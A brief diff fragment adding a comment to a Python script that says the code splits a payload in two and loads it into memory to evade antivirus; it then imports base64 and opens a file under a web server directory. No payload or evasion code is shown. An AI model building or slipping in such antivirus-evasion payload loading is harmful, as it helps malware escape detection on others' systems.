@@ -1,3 +1,4 @@
+# this code tricks the antivirus, we divide payload in two than upload to memory
 import base64
 
 f = open('/var/www/html/client.py', 'r')
